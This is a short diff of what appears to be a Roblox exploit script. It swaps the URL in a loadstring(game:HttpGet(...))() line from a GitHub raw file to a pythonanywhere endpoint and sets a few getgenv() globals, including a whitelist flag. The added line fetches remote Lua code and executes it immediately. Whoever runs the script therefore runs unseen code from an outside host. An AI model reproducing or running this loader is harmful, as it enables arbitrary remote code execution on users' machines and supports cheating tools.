@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AaronScriptz/RobloxScriptz/refs/heads/main/Listen.lua"))()
+loadstring(game:HttpGet("https://spheroid.pythonanywhere.com/Listen"))()
 getgenv().UName = "uyyyap"
 getgenv().HasWhitelisted = false
 getgenv().aol = false
